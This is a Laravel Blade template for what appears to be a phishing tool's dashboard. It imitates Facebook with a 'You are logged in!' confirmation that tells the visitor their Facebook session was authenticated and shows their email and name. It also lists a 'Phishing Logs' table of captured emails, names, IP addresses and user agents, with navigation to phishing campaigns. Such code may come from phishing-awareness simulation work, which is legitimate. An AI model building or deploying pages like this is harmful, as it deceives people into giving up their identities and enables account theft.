<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 90%;
            max-width: 1200px;
            margin: auto;
            margin-top: 50px;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 50px;
        }
        .success-message {
            color: #4CAF50;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .details {
            text-align: left;
            margin-top: 30px;
            padding: 20px;
            background: #f7f7f7;
            border-radius: 5px;
            margin-bottom: 30px;
        }
        .details p {
            margin: 10px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 30px;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 12px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
            color: #333;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f1f1f1;
        }
        .table-responsive {
            overflow-x: auto;
        }
        .table-title {
            text-align: left;
            font-size: 20px;
            margin-top: 40px;
            margin-bottom: 10px;
            color: #333;
            font-weight: bold;
            border-bottom: 2px solid #4267B2;
            padding-bottom: 10px;
        }
        .nav-menu {
            background: #4267B2;
            color: white;
            padding: 15px;
            text-align: left;
        }
        .nav-menu a {
            color: white;
            text-decoration: none;
            margin-right: 20px;
            font-weight: bold;
        }
        .nav-menu a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="nav-menu">
        <a href="{{ route('phishing.dashboard') }}">Dashboard</a>
        <a href="{{ route('campaigns.index') }}">Campaigns</a>
    </div>
    
    <div class="container">
        @if(isset($userData))
        <div class="success-message">
            <i class="fa fa-check-circle"></i> You are logged in!
        </div>
        <p>Thank you for logging into your Facebook account. Your session has been successfully authenticated.</p>
        
        <div class="details">
            <h3>Account Details:</h3>
            @if(isset($userData['email']))
                <p><strong>Email:</strong> {{ $userData['email'] }}</p>
            @endif
            
            @if(isset($userData['first_name']) && isset($userData['last_name']))
                <p><strong>Name:</strong> {{ $userData['first_name'] }} {{ $userData['last_name'] }}</p>
            @endif
            
            <p><strong>Login Time:</strong> {{ now()->format('Y-m-d H:i:s') }}</p>
            <p><strong>IP Address:</strong> {{ request()->ip() }}</p>
        </div>
        @endif

        <h2 class="table-title">Phishing Logs</h2>
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Type</th>
                        <th>Email</th>
                        <th>First Name</th>
                        <th>Last Name</th>
                        <th>IP Address</th>
                        <th>User Agent</th>
                        <th>Date</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach($logs as $log)
                    <tr>
                        <td>{{ $log->id }}</td>
                        <td>{{ $log->type }}</td>
                        <td>{{ $log->email }}</td>
                        <td>{{ $log->first_name }}</td>
                        <td>{{ $log->last_name }}</td>
                        <td>{{ $log->ip_address }}</td>
                        <td>{{ Str::limit($log->user_agent, 50) }}</td>
                        <td>{{ $log->created_at }}</td>
                    </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>